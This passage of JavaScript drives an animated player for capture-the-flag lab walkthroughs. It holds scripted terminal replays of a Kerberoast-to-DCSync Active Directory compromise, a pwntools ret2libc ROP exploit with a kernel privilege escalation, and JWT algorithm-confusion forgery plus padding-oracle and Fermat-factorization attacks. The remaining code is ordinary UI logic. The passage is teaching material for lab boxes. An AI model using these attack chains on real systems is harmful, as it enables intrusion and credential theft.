class=\"user\">root@kali</span>:<span class=\"path\">~</span># "},{"t":"cmd","x":"<span class=\"c\">crackmapexec</span> smb <span class=\"s\">10.10.30.10</span> <span class=\"p\">-u</span> j.chen <span class=\"p\">-p</span> <span class=\"s\">Autumn2024!</span> <span class=\"p\">--users</span>","pause":800},{"t":"hit","x":"tempest.lab\\Administrator"},{"t":"hit","x":"tempest.lab\\j.chen"},{"t":"hit","x":"tempest.lab\\svc_mssql    (desc: MSSQL service — DO NOT DISABLE)"},{"t":"warn","x":"[!] svc_mssql — service account = Kerberoast candidate"}]},{"label":"// PHASE 04 · KERBEROAST","title":"Request TGS for SPN, crack offline","desc":"Any authenticated user can request service tickets. Weak svc pwd cracks.","host":"root@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">root@kali</span>:<span class=\"path\">~</span># "},{"t":"cmd","x":"<span class=\"c\">impacket-GetUserSPNs</span> <span class=\"s\">tempest.lab/j.chen:'Autumn2024!'</span> <span class=\"p\">-dc-ip</span> <span class=\"s\">10.10.30.10</span> <span class=\"p\">-request</span>","pause":1000},{"t":"out","x":"ServicePrincipalName          Name        MemberOf"},{"t":"hit","x":"MSSQLSvc/sqlsrv.tempest.lab   svc_mssql   CN=Domain Admins"},{"t":"hit","x":"$krb5tgs$23$*svc_mssql$...[REDACTED]..."},{"t":"crit","x":"[!] svc_mssql is in DOMAIN ADMINS — game over if cracked"},{"t":"blank"},{"t":"prompt","x":"<span class=\"user\">root@kali</span>:<span class=\"path\">~</span># "},{"t":"cmd","x":"<span class=\"c\">hashcat</span> <span class=\"p\">-m</span> <span class=\"f\">13100</span> tgs.hash <span class=\"s\">rockyou.txt</span>","pause":1200},{"t":"hit","x":"$krb5tgs$23$*svc_mssql$... : Summer2023"},{"t":"info","x":"[+] svc_mssql : Summer2023"}]},{"label":"// PHASE 05 · BLOODHOUND","title":"Map the path to DA","desc":"Ingest SharpHound output. Verify the path visually before moving.","host":"root@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">root@kali</span>:<span class=\"path\">~</span># "},{"t":"cmd","x":"<span class=\"c\">bloodhound-python</span> <span class=\"p\">-u</span> svc_mssql <span class=\"p\">-p</span> <span class=\"s\">Summer2023</span> <span class=\"p\">-d</span> tempest.lab <span class=\"p\">-c</span> all","pause":900},{"t":"hit","x":"[+] Compressing data into 20260422_bloodhound.zip"},{"t":"blank"},{"t":"prompt","x":"<span class=\"user\">cypher</span>&gt; "},{"t":"cmd","x":"MATCH p=shortestPath((u:User {name:<span class=\"s\">\"SVC_MSSQL@TEMPEST.LAB\"</span>})-[*1..]-&gt;(g:Group {name:<span class=\"s\">\"DOMAIN ADMINS@TEMPEST.LAB\"</span>})) <span class=\"k\">RETURN</span> p;","pause":800},{"t":"hit","x":"[SVC_MSSQL] ─MemberOf→ [DOMAIN ADMINS]"},{"t":"info","x":"[+] Direct DA membership"}]},{"label":"// PHASE 06 · DCSYNC + DA","title":"secretsdump → KRBTGT → root.txt","desc":"With DA, replicate the directory to extract KRBTGT. PtH to finish.","host":"root@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">root@kali</span>:<span class=\"path\">~</span># "},{"t":"cmd","x":"<span class=\"c\">impacket-secretsdump</span> <span class=\"s\">tempest.lab/svc_mssql:Summer2023@10.10.30.10</span>","pause":1100},{"t":"hit","x":"[*] Dumping Domain Credentials"},{"t":"hit","x":"Administrator:500:aad3b435...:[REDACTED]:::"},{"t":"hit","x":"krbtgt:502:aad3b435...:[REDACTED]:::"},{"t":"hit","x":"svc_mssql:1116:aad3b435...:[REDACTED]:::"},{"t":"blank"},{"t":"prompt","x":"<span class=\"user\">root@kali</span>:<span class=\"path\">~</span># "},{"t":"cmd","x":"<span class=\"c\">evil-winrm</span> <span class=\"p\">-i</span> <span class=\"s\">10.10.30.10</span> <span class=\"p\">-u</span> Administrator <span class=\"p\">-H</span> <span class=\"s\">[REDACTED]</span>","pause":700},{"t":"hit","x":"*Evil-WinRM* PS C:\\Users\\Administrator&gt;"},{"t":"prompt","x":"<span class=\"ps\">*Evil-WinRM*</span> <span class=\"path\">PS&gt;</span> "},{"t":"cmd","x":"<span class=\"c\">type</span> Desktop\\root.txt","pause":400},{"t":"hit","x":"█░▒▓░▒ REDACTED ▒░▓▒░█"},{"t":"info","x":"[+] TEMPEST pwned · KRBTGT extracted"}]}]},{"id":"wraith","name":"WRAITH","number":"03","difficulty":"HARD","theme":"Binary Exploitation","tagline":"reverse engineering · rop · libc leak","desc":"Custom service on non-standard port. Reverse the binary, identify the overflow, leak libc via format-string, build a ROP chain.","stacks":["Ghidra","GDB","pwntools","ROP","libc"],"color":"#ff1744","glow":"rgba(255,23,68,0.3)","phases":[{"label":"// PHASE 01 · SERVICE DISCOVERY","title":"Non-standard port + binary drop","desc":"Unfamiliar service banner. Pull the binary via a low-priv SSH account for offline analysis.","host":"attacker@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">nmap</span> <span class=\"p\">-sV -p-</span> <span class=\"s\">10.10.40.20</span>","pause":700},{"t":"out","x":"PORT     STATE SERVICE VERSION"},{"t":"hit","x":"22/tcp   open  ssh     OpenSSH 9.0p1"},{"t":"hit","x":"9999/tcp open  ???     (banner: WRAITH v1.2 — send your name)"},{"t":"blank"},{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">nc</span> <span class=\"s\">10.10.40.20</span> <span class=\"f\">9999</span>","pause":400},{"t":"out","x":"WRAITH v1.2 — send your name:"},{"t":"cmd","x":"hax"},{"t":"hit","x":"Hello, hax! Press Ctrl+C to exit."},{"t":"info","x":"[+] Binary pulled via companion SSH — /opt/wraith/wraithd"}]},{"label":"// PHASE 02 · REVERSE ENGINEERING","title":"Ghidra → identify BOF","desc":"Static analysis shows unbounded read into a stack buffer + format-string. No PIE, no canary.","host":"attacker@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">checksec</span> <span class=\"p\">--file</span>=wraithd","pause":500},{"t":"hit","x":"RELRO        : Partial"},{"t":"hit","x":"Stack Canary : No canary found"},{"t":"hit","x":"NX           : NX enabled"},{"t":"hit","x":"PIE          : No PIE (0x400000)"},{"t":"info","x":"[+] No canary + no PIE — ROP chain viable"},{"t":"blank"},{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">ghidra</span> wraithd  <span class=\"m\"># pseudocode:</span>"},{"t":"out","x":"void handle_client(int fd) {"},{"t":"out","x":"    char name[64];"},{"t":"hit","x":"    read(fd, name, 0x400);    // 1024 into 64-byte buf"},{"t":"hit","x":"    printf(name);              // format-string primitive"},{"t":"out","x":"}"},{"t":"crit","x":"[!] Two bugs: unbounded read + FSB"}]},{"label":"// PHASE 03 · LIBC LEAK","title":"Format-string → libc base","desc":"Scan stack offsets via %p. Find a libc pointer, subtract symbol offset → base.","host":"attacker@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">python3</span> <span class=\"p\">-c</span> <span class=\"s\">'print(\"%p.%p.%p.%p.%p.%p\")'</span> | <span class=\"c\">nc</span> <span class=\"s\">10.10.40.20</span> <span class=\"f\">9999</span>","pause":800},{"t":"hit","x":"Hello, 0x7ffc8a2b41e0.0x401230.0x7f9a1b2c6083.(nil).0x1.0x4011f0"},{"t":"info","x":"[+] Offset 3 = libc pointer"},{"t":"blank"},{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">python3</span> <span class=\"p\">-c</span> <span class=\"s\">'print(\"%3$p\")'</span> | <span class=\"c\">nc</span> <span class=\"s\">10.10.40.20</span> <span class=\"f\">9999</span>","pause":500},{"t":"hit","x":"Hello, 0x7f9a1b2c6083"},{"t":"hit","x":"libc base = 0x7f9a1b29f000"}]},{"label":"// PHASE 04 · ROP CHAIN","title":"Build ret2libc payload","desc":"Classic 3-gadget chain: pop rdi ; ret | \"/bin/sh\" | system.","host":"attacker@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">cat</span> exploit.py","pause":400},{"t":"out","x":"from pwn import *"},{"t":"out","x":"libc = ELF('./libc.so.6')"},{"t":"out","x":"p = remote('10.10.40.20', 9999)"},{"t":"out","x":"p.sendline(b'%3$p')"},{"t":"out","x":"leak = int(p.recvline().split()[1], 16)"},{"t":"out","x":"libc.address = leak - libc.sym['__libc_start_main'] - 0x83"},{"t":"hit","x":"POP_RDI  = libc.address + 0x023b6a"},{"t":"hit","x":"RET      = libc.address + 0x022679"},{"t":"hit","x":"SYSTEM   = libc.sym['system']"},{"t":"hit","x":"BINSH    = next(libc.search(b'/bin/sh'))"},{"t":"hit","x":"payload  = b'A'*72 + p64(POP_RDI)+p64(BINSH)+p64(RET)+p64(SYSTEM)"},{"t":"hit","x":"p.sendline(payload); p.interactive()"}]},{"label":"// PHASE 05 · POP SHELL","title":"Execute the exploit","desc":"Fire it at the service. Get the user flag.","host":"attacker@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">python3</span> exploit.py","pause":1100},{"t":"out","x":"[+] Opening connection to 10.10.40.20:9999 Done"},{"t":"out","x":"[+] Leaked libc base: 0x7f9a1b29f000"},{"t":"out","x":"[+] Sending ROP payload (104 bytes)"},{"t":"out","x":"[*] Switching to interactive mode"},{"t":"blank"},{"t":"hit","x":"$ id"},{"t":"hit","x":"uid=1000(wraith) gid=1000(wraith)"},{"t":"hit","x":"$ cat /home/wraith/user.txt"},{"t":"hit","x":"█░▒▓░▒ REDACTED ▒░▓▒░█"},{"t":"info","x":"[+] USER FLAG captured"}]},{"label":"// PHASE 06 · KERNEL PRIVESC","title":"Vulnerable kmod → root","desc":"Custom char device allows arbitrary byte writes to kernel memory. Patch cred struct, uid 0.","host":"wraith@wraith ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">wraith@wraith</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">ls</span> <span class=\"p\">-la</span> /dev/ | <span class=\"c\">grep</span> <span class=\"s\">wraith</span>","pause":400},{"t":"hit","x":"crw-rw-rw- 1 root root 240, 0 /dev/wraith_dev"},{"t":"blank"},{"t":"prompt","x":"<span class=\"user\">wraith@wraith</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">dmesg</span> | <span class=\"c\">grep</span> <span class=\"s\">wraith</span>","pause":400},{"t":"hit","x":"wraith_drv: Loaded vulnerable debug module (ioctl 0x1337 = arbwrite)"},{"t":"blank"},{"t":"prompt","x":"<span class=\"user\">wraith@wraith</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">./kexp</span>","pause":800},{"t":"hit","x":"[+] init_task @ 0xffffffff82010240"},{"t":"hit","x":"[+] walking task_struct → cred → uid=1000"},{"t":"hit","x":"[+] patched cred uid/gid → 0"},{"t":"hit","x":"# id"},{"t":"hit","x":"uid=0(root) gid=0(root)"},{"t":"prompt","x":"<span class=\"user\">#</span> "},{"t":"cmd","x":"<span class=\"c\">cat</span> /root/root.txt","pause":400},{"t":"hit","x":"█░▒▓░▒ REDACTED ▒░▓▒░█"},{"t":"info","x":"[+] WRAITH pwned · userland→kernel full chain"}]}]},{"id":"vault","name":"VAULT","number":"04","difficulty":"INSANE","theme":"Cryptography","tagline":"jwt · padding oracle · rsa recovery","desc":"A hardened vault exposing only crypto endpoints. JWT alg confusion, CBC padding oracle, Fermat factorization — pure cryptanalysis.","stacks":["JWT","CBC Oracle","RSA","Python crypto"],"color":"#ffd700","glow":"rgba(255,215,0,0.3)","phases":[{"label":"// PHASE 01 · JWT DISCOVERY","title":"RS256 + exposed JWKS","desc":"Auth is Bearer JWT. Signing public key served openly at /.well-known/jwks.json.","host":"attacker@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">curl</span> <span class=\"p\">-sk</span> <span class=\"s\">https://vault.target/.well-known/jwks.json</span> | <span class=\"c\">jq</span>","pause":700},{"t":"hit","x":"{\"keys\":[{\"kty\":\"RSA\",\"kid\":\"v1\",\"alg\":\"RS256\","},{"t":"hit","x":"          \"n\":\"uGbX-7...(2048 bits)...\",\"e\":\"AQAB\"}]}"},{"t":"blank"},{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">curl</span> <span class=\"p\">-sk</span> <span class=\"s\">https://vault.target/api/me</span> <span class=\"p\">-H</span> <span class=\"s\">\"Authorization: Bearer $TOKEN\"</span>","pause":500},{"t":"hit","x":"{\"user\":\"guest\",\"role\":\"read-only\"}"},{"t":"info","x":"[+] Need role=admin — attack the JWT alg"}]},{"label":"// PHASE 02 · ALG CONFUSION","title":"RS256 → HS256 w/ pubkey","desc":"If the server validates whatever alg the token declares, sign with the RSA public key as HMAC secret.","host":"attacker@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">python3</span> forge.py","pause":600},{"t":"out","x":"pub_pem = open('jwks_pub.pem','rb').read()"},{"t":"hit","x":"payload = {'user':'admin','role':'admin','iat':...}"},{"t":"hit","x":"forged = jwt.encode(payload, pub_pem, algorithm='HS256',"},{"t":"hit","x":"                    headers={'alg':'HS256','kid':'v1'})"},{"t":"blank"},{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">curl</span> <span class=\"p\">-sk</span> <span class=\"s\">https://vault.target/api/me</span> <span class=\"p\">-H</span> <span class=\"s\">\"Authorization: Bearer $FORGED\"</span>","pause":600},{"t":"hit","x":"{\"user\":\"admin\",\"role\":\"admin\"}"},{"t":"info","x":"[+] Admin context · vault endpoints unlocked"}]},{"label":"// PHASE 03 · CBC ORACLE","title":"Differential error = oracle","desc":"Encrypted blob endpoint returns distinct errors for invalid padding vs invalid MAC. Vaudenay oracle.","host":"attacker@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">curl</span> <span class=\"p\">-sk</span> <span class=\"s\">https://vault.target/api/vault/blob/1</span> <span class=\"p\">-H</span> <span class=\"s\">\"Authorization: Bearer $FORGED\"</span>","pause":500},{"t":"hit","x":"{\"iv\":\"4a6e...\",\"ct\":\"9f20...(192 bytes)...\",\"enc\":\"AES-256-CBC\"}"},{"t":"blank"},{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">curl</span> <span class=\"p\">-sk -X</span> POST <span class=\"s\">/api/vault/decrypt</span> <span class=\"p\">-d</span> <span class=\"s\">'{\"ct\":\"...FF\"}'</span>","pause":400},{"t":"hit","x":"HTTP 400 — invalid PKCS#7 padding"},{"t":"cmd","x":"<span class=\"c\">curl</span> <span class=\"p\">-sk -X</span> POST <span class=\"s\">/api/vault/decrypt</span> <span class=\"p\">-d</span> <span class=\"s\">'{\"ct\":\"...00\"}'</span>","pause":400},{"t":"hit","x":"HTTP 400 — invalid MAC"},{"t":"crit","x":"[!] Differential error = padding oracle"}]},{"label":"// PHASE 04 · DECRYPT BLOB","title":"Padding oracle byte-by-byte","desc":"Recover 192 bytes of plaintext one byte at a time.","host":"attacker@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">python3</span> padbuster.py <span class=\"s\">\"https://vault.target/api/vault/decrypt\"</span>","pause":1200},{"t":"out","x":"[+] Blocks: 12 · Block size: 16"},{"t":"out","x":"[*] Block 1/12: ██████████████████  OK"},{"t":"out","x":"[*] Block 2/12: ██████████████████  OK"},{"t":"out","x":"[*] Block 12/12: ██████████████████ OK"},{"t":"hit","x":"[+] Plaintext:"},{"t":"hit","x":"{\"vault_key_rsa_enc\":\"A9E3B1...(256 bytes)...\","},{"t":"hit","x":" \"master_hint\":\"n is 2x prime, tiny gap\"}"},{"t":"info","x":"[+] Vault key is RSA-wrapped — factor next"}]},{"label":"// PHASE 05 · FERMAT FACTOR","title":"Close primes = easy factor","desc":"The hint tells us the 2048-bit n uses primes too close. Fermat factors in seconds.","host":"attacker@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">python3</span> fermat.py <span class=\"s\">vault_rsa.pub</span>","pause":800},{"t":"out","x":"import gmpy2"},{"t":"out","x":"n = int(open('n.txt').read(),16)"},{"t":"out","x":"a = gmpy2.isqrt(n) + 1"},{"t":"out","x":"while True:"},{"t":"out","x":"  b2 = a*a - n"},{"t":"out","x":"  if gmpy2.is_square(b2): break"},{"t":"out","x":"  a += 1"},{"t":"hit","x":"[+] Iterations: 14"},{"t":"hit","x":"[+] p = 0xfa9c7e..."},{"t":"hit","x":"[+] q = 0xfa9c7f..."},{"t":"info","x":"[+] Private key reconstructed in 0.3 s"}]},{"label":"// PHASE 06 · RSA UNWRAP","title":"OAEP decrypt with d","desc":"Use the reconstructed private key to unwrap the AES vault key.","host":"attacker@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">python3</span> unwrap.py","pause":700},{"t":"out","x":"from Crypto.PublicKey import RSA"},{"t":"out","x":"from Crypto.Cipher import PKCS1_OAEP"},{"t":"out","x":"key = RSA.construct((n, e, d))"},{"t":"out","x":"cipher = PKCS1_OAEP.new(key)"},{"t":"out","x":"vault_key = cipher.decrypt(bytes.fromhex('A9E3B1...'))"},{"t":"blank"},{"t":"hit","x":"7c9a41e0b23d...(32 bytes — AES-256 vault key)"},{"t":"info","x":"[+] Vault master key in hand"}]},{"label":"// PHASE 07 · UNLOCK VAULT","title":"Final decrypt · both flags","desc":"Decrypt the final vault blob. VAULT is a crypto box — no shell needed.","host":"attacker@kali ~ ","lines":[{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">curl</span> <span class=\"p\">-sk</span> <span class=\"s\">https://vault.target/api/vault/final</span> <span class=\"p\">-H</span> <span class=\"s\">\"Authorization: Bearer $FORGED\"</span>","pause":500},{"t":"hit","x":"{\"iv\":\"7e31...\",\"ct\":\"c4b2...(96 bytes)...\"}"},{"t":"blank"},{"t":"prompt","x":"<span class=\"user\">attacker@kali</span>:<span class=\"path\">~</span>$ "},{"t":"cmd","x":"<span class=\"c\">python3</span> decrypt_final.py","pause":700},{"t":"out","x":"c = AES.new(vault_key, AES.MODE_CBC, iv)"},{"t":"out","x":"pt = c.decrypt(ct)"},{"t":"blank"},{"t":"hit","x":"---- VAULT FINAL ----"},{"t":"hit","x":"user_flag: █░▒▓░▒ REDACTED ▒░▓▒░█"},{"t":"hit","x":"root_flag: █░▒▓░▒ REDACTED ▒░▓▒░█"},{"t":"hit","x":"---------------------"},{"t":"info","x":"[+] BOTH FLAGS captured · pure cryptanalysis"},{"t":"crit","x":"[✓] No shell. No exploit. Just math."}]}]}];
+
+let state = { currentBox:null, phaseIdx:0, lineIdx:0, playing:false, speed:1, cursor:null, skipRequested:false };
+
+const $ = id => document.getElementById(id);
+const galleryView = $('gallery-view'), playerView = $('player-view'), cardGrid = $('card-grid');
+const term = $('term'), phaseList = $('phase-list');
+const phaseLabel = $('phase-label'), phaseTitle = $('phase-title'), phaseDesc = $('phase-desc');
+const phaseIndicator = $('phase-indicator'), tierIndicator = $('tier-indicator');
+const termHost = $('term-host'), termStatus = $('term-status');
+const progress = $('progress'), complete = $('complete');
+const playerBrand = $('player-brand'), completeTitle = $('complete-title'), completeSub = $('complete-sub');
+
+function buildGallery() {
+  cardGrid.innerHTML = '';
+  WALKTHROUGHS.forEach((wt, i) => {
+    const card = document.createElement('div');
+    card.className = 'wt-card';
+    card.style.setProperty('--card-color', wt.color);
+    card.style.setProperty('--card-glow', wt.glow);
+    const stacks = wt.stacks.map(s => `<span class="wt-stack-pill">${s}</span>`).join('');
+    card.innerHTML = `
+      <div class="wt-card-num">// ${wt.number} · ${wt.theme.toUpperCase()}</div>
+      <div class="wt-card-title">${wt.name}</div>
+      <div class="wt-card-subtitle">${wt.tagline}</div>
+      <div class="wt-card-desc">${wt.desc}</div>
+      <div class="wt-card-stacks">${stacks}</div>
+      <div class="wt-card-footer">
+        <span class="wt-difficulty">${wt.difficulty}</span>
+        <span class="wt-play-hint">${wt.phases.length} phases ▶</span>
+      </div>`;
+    card.addEventListener('click', () => openPlayer(i));
+    cardGrid.appendChild(card);
+  });
+}
+
+function applyTheme(wt) {
+  document.documentElement.style.setProperty('--accent', wt.color);
+  document.documentElement.style.setProperty('--accent-glow', wt.glow);
+}
+
+function openPlayer(boxIdx) {
+  state.currentBox = boxIdx;
+  state.phaseIdx = 0; state.lineIdx = 0;
+  state.playing = false; state.skipRequested = false;
+  const wt = WALKTHROUGHS[boxIdx];
+  applyTheme(wt);
+  playerBrand.innerHTML = `BOX::<span>${wt.name}</span>`;
+  tierIndicator.textContent = wt.difficulty;
+  completeTitle.textContent = wt.name;
+  completeSub.textContent = `${wt.phases.length} phases · ${wt.theme} · ${wt.difficulty}`;
+  buildPhaseList(wt);
+  updateUI();
+  term.innerHTML = '';
+  complete.classList.remove('show');
+  setStatus('READY');
+  progress.style.width = '0%';
+  $('btn-play').disabled = false;
+  $('btn-pause').disabled = true;
+  galleryView.classList.add('hide');
+  playerView.classList.add('show');
+  window.scrollTo({ top: 0, behavior: 'instant' });
+}
+
+function closePlayer() {
+  state.skipRequested = true; state.playing = false;
+  setTimeout(() => {
+    playerView.classList.remove('show');
+    galleryView.classList.remove('hide');
+    applyTheme({ color:'#00e676', glow:'rgba(0,230,118,0.3)' });
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }, 100);
+}
+
+function buildPhaseList(wt) {
+  phaseList.innerHTML = '';
+  wt.phases.forEach((p, i) => {
+    const li = document.createElement('li');
+    li.className = 'phase-item';
+    li.dataset.idx = i;
+    li.innerHTML = `<span class="phase-num-tag">${String(i+1).padStart(2,'0')}</span><span>${p.title}</span>`;
+    li.addEventListener('click', () => jumpToPhase(i));
+    phaseList.appendChild(li);
+  });
+}
+
+function updateUI() {
+  const wt = WALKTHROUGHS[state.currentBox];
+  const p = wt.phases[state.phaseIdx];
+  phaseLabel.textContent = p.label;
+  phaseTitle.innerHTML = p.title.replace(/(SQLi|SUID|NTLMv2|TGS|DCSync|ROP|BOF|libc|JWT|CBC|RSA|OAEP|AES|PKCS)/g, '<span class="acc">$1</span>');
+  phaseDesc.textContent = p.desc;
+  phaseIndicator.textContent = `${String(state.phaseIdx+1).padStart(2,'0')} / ${String(wt.phases.length).padStart(2,'0')}`;
+  termHost.textContent = p.host;
+  document.querySelectorAll('.phase-item').forEach(el => {
+    const idx = parseInt(el.dataset.idx);
+    el.classList.remove('active','done');
+    if (idx < state.phaseIdx) el.classList.add('done');
+    else if (idx === state.phaseIdx) el.classList.add('active');
+  });
+  updateProgress();
+}
+
+function updateProgress() {
+  const wt = WALKTHROUGHS[state.currentBox];
+  const total = wt.phases.reduce((a,ph) => a + ph.lines.length, 0);
+  let done = 0;
+  for (let i=0; i<state.phaseIdx; i++) done += wt.phases[i].lines.length;
+  done += state.lineIdx;
+  progress.style.width = (done / total * 100) + '%';
+}
+
+function removeCursor() { if (state.cursor) { state.cursor.remove(); state.cursor = null; } }
+function addCursorTo(el) { removeCursor(); const c = document.createElement('span'); c.className = 'cursor'; el.appendChild(c); state.cursor = c; }
+function addLine(type) { const el = document.createElement('div'); el.className = 'line ' + type; term.appendChild(el); term.scrollTop = term.scrollHeight; return el; }
+function setStatus(s) { termStatus.textContent = s; }
+function sleep(ms) {
+  return new Promise(r => {
+    const check = () => {
+      if (state.skipRequested) return r();
+      if (!state.playing) { setTimeout(check, 60); return; }
+      setTimeout(r, ms);
+    };
+    check();
+  });
+}
+
+async function renderLine(line) {
+  if (state.skipRequested) return;
+  if (line.t === 'blank') { const el = addLine('out'); el.innerHTML = '&nbsp;'; return; }
+  if (line.t === 'prompt') {
+    const el = addLine('prompt'); el.innerHTML = line.x;
+    term.scrollTop = term.scrollHeight;
+    await sleep(80 * state.speed);
+    return;
+  }
+  if (line.t === 'cmd') {
+    let last = term.lastElementChild;
+    const el = (last && last.classList.contains('prompt')) ? last : addLine('prompt');
+    const cmdSpan = document.createElement('span');
+    el.appendChild(cmdSpan);
+    addCursorTo(el);
+    const plain = line.x.replace(/<[^>]*>/g, '');
+    let revealed = '';
+    for (let i = 0; i < plain.length; i++) {
+      if (state.skipRequested) break;
+      revealed += plain[i];
+      cmdSpan.textContent = revealed;
+      el.appendChild(state.cursor);
+      term.scrollTop = term.scrollHeight;
+      const ch = plain[i];
+      let d = 18 * state.speed;
+      if (ch === ' ') d *= 0.5;
+      if (ch === '\n') d *= 2;
+      await sleep(d + Math.random() * 10 * state.speed);
+    }
+    removeCursor();
+    cmdSpan.innerHTML = line.x;
+    term.scrollTop = term.scrollHeight;
+    if (line.pause) await sleep(line.pause * state.speed);
+    return;
+  }
+  const map = { out:'out', hit:'out hit', info:'info', warn:'warn', crit:'crit' };
+  const el = addLine(map[line.t] || 'out');
+  el.innerHTML = line.x;
+  term.scrollTop = term.scrollHeight;
+  const d = (line.t === 'hit' || line.t === 'info' || line.t === 'crit' || line.t === 'warn') ? 130 : 60;
+  await sleep(d * state.speed);
+}
+
+async function playPhase(idx) {
+  const wt = WALKTHROUGHS[state.currentBox];
+  state.phaseIdx = idx; state.lineIdx = 0; state.skipRequested = false;
+  updateUI();
+  term.innerHTML = '';
+  setStatus('LIVE');
+  const phase = wt.phases[idx];
+  for (let i = 0; i < phase.lines.length; i++) {
+    if (!state.playing && !state.skipRequested) {
+      while (!state.playing && !state.skipRequested) await new Promise(r => setTimeout(r, 100));
+    }
+    state.lineIdx = i;
+    updateProgress();
+    await renderLine(phase.lines[i]);
+    if (state.skipRequested) break;
+  }
+  state.lineIdx = phase.lines.length;
+  updateProgress();
+  setStatus('PHASE COMPLETE');
+  removeCursor();
+}
+
+async function playAll(fromIdx) {
+  const wt = WALKTHROUGHS[state.currentBox];
+  state.playing = true;
+  $('btn-play').disabled = true;
+  $('btn-pause').disabled = false;
+  for (let i = fromIdx; i < wt.phases.length; i++) {
+    if (!state.playing && !state.skipRequested) break;
+    state.skipRequested = false;
+    await playPhase(i);
+    if (!state.playing) return;
+    await sleep(1000 * state.speed);
+  }
+  state.playing = false;
+  $('btn-play').disabled = false;
+  $('btn-pause').disabled = true;
+  setStatus('COMPLETE');
+  complete.classList.add('show');
+  complete.scrollIntoView({ behavior: 'smooth', block: 'start' });
+}
+
+function jumpToPhase(idx) {
+  state.skipRequested = true; state.playing = false;
+  setTimeout(() => {
+    complete.classList.remove('show');
+    state.phaseIdx = idx; state.lineIdx = 0;
+    updateUI();
+    term.innerHTML = '';
+    setStatus('READY');
+    $('btn-play').disabled = false;
+    $('btn-pause').disabled = true;
+  }, 100);
+}
+
+$('btn-play').addEventListener('click', () => {
+  const wt = WALKTHROUGHS[state.currentBox];
+  complete.classList.remove('show');
+  if (state.phaseIdx >= wt.phases.length) state.phaseIdx = 0;
+  playAll(state.phaseIdx);
+});
+$('btn-pause').addEventListener('click', () => {
+  state.playing = false;
+  $('btn-play').disabled = false;
+  $('btn-pause').disabled = true;
+  setStatus('PAUSED');
+});
+$('btn-next').addEventListener('click', () => {
+  const wt = WALKTHROUGHS[state.currentBox];
+  if (state.phaseIdx < wt.phases.length - 1) {
+    const was = state.playing;
+    jumpToPhase(state.phaseIdx + 1);
+    if (was) setTimeout(() => playAll(state.phaseIdx), 180);
+  }
+});
+$('btn-prev').addEventListener('click', () => {
+  if (state.phaseIdx > 0) {
+    const was = state.playing;
+    jumpToPhase(state.phaseIdx - 1);
+    if (was) setTimeout(() => playAll(state.phaseIdx), 180);
+  }
+});
+$('btn-reset').addEventListener('click', () => {
+  state.skipRequested = true; state.playing = false;
+  setTimeout(() => {
+    complete.classList.remove('show');
+    state.phaseIdx = 0; state.lineIdx = 0;
+    updateUI();
+    term.innerHTML = '';
+    setStatus('IDLE');
+    progress.style.width = '0%';
+    $('btn-play').disabled = false;
+    $('btn-pause').disabled = true;
+  }, 100);
+});
+document.querySelectorAll('.speed-btn').forEach(b => {
+  b.addEventListener('click', () => {
+    document.querySelectorAll('.speed-btn').forEach(x => x.classList.remove('active'));
+    b.classList.add('active');
+    state.speed = parseFloat(b.dataset.speed);
+  });
+});
+$('btn-gallery').addEventListener('click', closePlayer);
+$('btn-back-gallery').addEventListener('click', closePlayer);
+$('btn-replay').addEventListener('click', () => {
+  complete.classList.remove('show');
+  state.phaseIdx = 0; state.lineIdx = 0;
+  term.innerHTML = '';
+  updateUI();
+  setStatus('READY');
+  playAll(0);
+});
+$('btn-next-box').addEventListener('click', () => {
+  const nextIdx = (state.currentBox + 1) % WALKTHROUGHS.length;
+  openPlayer(nextIdx);
